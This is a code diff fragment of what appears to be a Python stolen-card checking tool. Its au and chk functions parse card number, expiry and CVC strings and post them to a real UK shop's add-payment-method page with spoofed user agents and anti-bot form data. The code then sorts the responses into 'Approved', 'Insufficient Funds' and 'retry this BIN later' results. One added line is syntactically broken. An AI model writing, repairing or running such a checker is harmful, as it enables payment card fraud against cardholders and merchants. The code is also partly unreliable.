-    'ct_no_cookie_hidden_field': '_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3Rfc2Vzc2lvbl9pZCI6ImpuY3JleHNvIiwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiJTdCJTIydmlzaWJsZV9maWVsZHMlMjIlM0ElMjIlMjIlMkMlMjJ2aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTAlMkMlMjJpbnZpc2libGVfZmllbGRzJTIyJTNBJTIyYnJhaW50cmVlX2NjX25vbmNlX2tleSUyMGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSUyMGJyYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5JTIwYnJhaW50cmVlX2NjX2NvbmZpZ19kYXRhJTIwd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlJTIwX3dwX2h0dHBfcmVmZXJlciUyMHdvb2NvbW1lcmNlX2FkZF9wYXltZW50X21ldGhvZCUyMGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiUyMGFwYmN0X3Zpc2libGVfZmllbGRzJTIwY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCUyMiUyQyUyMmludmlzaWJsZV9maWVsZHNfY291bnQlMjIlM0ExMCU3RCIsImN0X2ZrcF90aW1lc3RhbXAiOiIxNzIwNjA5NzQ3IiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzNjAlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMTY2MCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM2MCUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E3MDklN0QiLCJhcGJjdF9wcmV2X3JlZmVyZXIiOiJodHRwczovL3RyYWRlLWNoZW0uY28udWsvbXktYWNjb3VudC9wYXltZW50LW1ldGhvZHMvIiwiY3RfY2hlY2tqcyI6IjE0NzQ0MzAwNDAiLCJjdF90aW1lem9uZSI6IjMiLCJhcGJjdF9waXhlbF91cmwiOiJodHRwcyUzQSUyRiUyRm1vZGVyYXRlOC12NC5jbGVhbnRhbGsub3JnJTJGcGl4ZWwlMkZmZjE2NWQ1ZThhZTc4YmFkMDZhMTQzNDA3YWNjNWUyZi5naWYiLCJjdF9jaGVja2VkX2VtYWlscyI6IjAiLCJjdF9oYXNfa2V5X3VwIjoidHJ1ZSIsImN0X3BzX3RpbWVzdGFtcCI6IjE3MjA2MDk3MzUiLCJhcGJjdF9wYWdlX2hpdHMiOjE4LCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNzIwNjA4MDczIiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyNWM2OTIyMmMyNGU1MzA1ZTg3ZTY0ZmU1NmQ4Nzc0MWQlMjIlN0QiLCJjdF9wb2ludGVyX2RhdGEiOiIlNUIlNUI0MDElMkMyMDIlMkMxMzA1NSU1RCU1RCIsImFwYmN0X3NpdGVfcmVmZXJlciI6Imh0dHBzOi8vbWFpbC5nb29nbGUuY29tLyIsImFwYmN0X2lmcmFtZXNfcHJvdGVjdGVkIjpbXSwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3RyYWRlLWNoZW0uY28udWsvbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIiwidHlwbyI6W119',
-	}
+    'ct_no_cookie_hidden_field': '_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3Rfc2Vzc2lvbl9pZCI6InN4YW0iLCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X2Nvb2tpZXNfdHlwZSI6Im5vbmUiLCJhcGJjdF9oZWFkbGVzcyI6ImZhbHNlIiwiYXBiY3RfdmlzaWJsZV9maWVsZHMiOiIlN0IlMjJ2aXNpYmxlX2ZpZWxkcyUyMiUzQSUyMiUyMiUyQyUyMnZpc2libGVfZmllbGRzX2NvdW50JTIyJTNBMCUyQyUyMmludmlzaWJsZV9maWVsZHMlMjIlM0ElMjJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5JTIwYnJhaW50cmVlX2NjX2RldmljZV9kYXRhJTIwYnJhaW50cmVlX2NjXzNkc19ub25jZV9rZXklMjBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGElMjB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UlMjBfd3BfaHR0cF9yZWZlcmVyJTIwd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kJTIwY3RfYm90X2RldGVjdG9yX2V2ZW50X3Rva2VuJTIwYXBiY3RfdmlzaWJsZV9maWVsZHMlMjBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkJTIyJTJDJTIyaW52aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTEwJTdEIiwiY3RfZmtwX3RpbWVzdGFtcCI6IjE3MjQyMzg4NzUiLCJjdF9zY3JlZW5faW5mbyI6IiU3QiUyMmZ1bGxXaWR0aCUyMiUzQTM2MCUyQyUyMmZ1bGxIZWlnaHQlMjIlM0ExNDg0JTJDJTIydmlzaWJsZVdpZHRoJTIyJTNBMzYwJTJDJTIydmlzaWJsZUhlaWdodCUyMiUzQTcwOSU3RCIsImFwYmN0X3ByZXZfcmVmZXJlciI6Imh0dHBzOi8vdHJhZGUtY2hlbS5jby51ay9teS1hY2NvdW50L3BheW1lbnQtbWV0aG9kcy8iLCJjdF9jaGVja2pzIjoiNDY1MDExNTM2IiwiY3RfdGltZXpvbmUiOiIzIiwiYXBiY3RfcGl4ZWxfdXJsIjoiaHR0cHMlM0ElMkYlMkZtb2RlcmF0ZTQtdjQuY2xlYW50YWxrLm9yZyUyRnBpeGVsJTJGYzcwZGYwOTAzZDYwYmI5NDA3NTY5MzhmMjM5YzRiMWMuZ2lmIiwiY3RfY2hlY2tlZF9lbWFpbHMiOiIwIiwiY3RfaGFzX2tleV91cCI6InRydWUiLCJjdF9wc190aW1lc3RhbXAiOiIxNzI0MjM4ODU0IiwiYXBiY3RfcGFnZV9oaXRzIjoxNiwiY3RfaGFzX2lucHV0X2ZvY3VzZWQiOiJ0cnVlIiwiYXBiY3Rfc2l0ZV9sYW5kaW5nX3RzIjoiMTcyNDIzODUxNSIsImFwYmN0X2Nvb2tpZXNfdGVzdCI6IiU3QiUyMmNvb2tpZXNfbmFtZXMlMjIlM0ElNUIlMjJhcGJjdF90aW1lc3RhbXAlMjIlMkMlMjJhcGJjdF9zaXRlX2xhbmRpbmdfdHMlMjIlNUQlMkMlMjJjaGVja192YWx1ZSUyMiUzQSUyMjQwMzdkMWIzMGY0NDVkMGZmMGZkNTYzYzM3YWE5NWZmJTIyJTdEIiwiY3RfcG9pbnRlcl9kYXRhIjoiJTVCJTVCNDM4JTJDMjMwJTJDMjI2MDYlNUQlNUQiLCJhcGJjdF9pZnJhbWVzX3Byb3RlY3RlZCI6W10sImFwYmN0X3Nlc3Npb25fY3VycmVudF9wYWdlIjoiaHR0cHM6Ly90cmFkZS1jaGVtLmNvLnVrL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyIsImFwYmN0X3NpdGVfcmVmZXJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwidHlwbyI6W119',
+}
 	
-	response = requests.post('https://trade-chem.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	response = r.post(
+	    'https://trade-chem.co.uk/my-account/add-payment-method/',
+	    cookies=r.cookies,
+	    headers=headers,
+	    data=data,
+	)
 	text = response.text
 	pattern = r'Reason: (.+?)\s*</li>'
 	match = re.search(pattern, text)
@@ -4560,13 +4456,15 @@ def au(ccx):
 	else:
 		if 'Payment method successfully added.' in text or 'Invalid postal code' in text:
 			result = "1000: Approved"
+		elif 'Insufficient Funds' in result
+			result = "Insufficient Funds"
 		elif 'risk_threshold' in text:
 			result = "RISK: Retry this BIN later."
 		elif 'Please wait for 20 seconds' in text:
 			result = "RISK"
 		else:
 			result = "RISK"
-	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
+	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result:
 		return 'Approved'
 	else:
 		return result
@@ -5063,13 +4961,14 @@ def stn(card):
 		else:
 			return '#Your card has been declined'
 def chk(card):
-	import requests
-	ccx=ccx.strip()
-	n = ccx.split("|")[0]
-	mm = ccx.split("|")[1]
-	yy = ccx.split("|")[2]
-	cvc = ccx.split("|")[3]
-	if "20" in yy:#Mo3gza
+	import requests, re, base64, random, string, user_agent, time
+	card = card.strip()
+	parts = re.split('[|]', card)
+	n = parts[0]
+	mm = parts[1]
+	yy = parts[2]
+	cvc = parts[3]
+	if "20" in yy:
 		yy = yy.split("20")[1]
 		
 	user = user_agent.generate_user_agent()
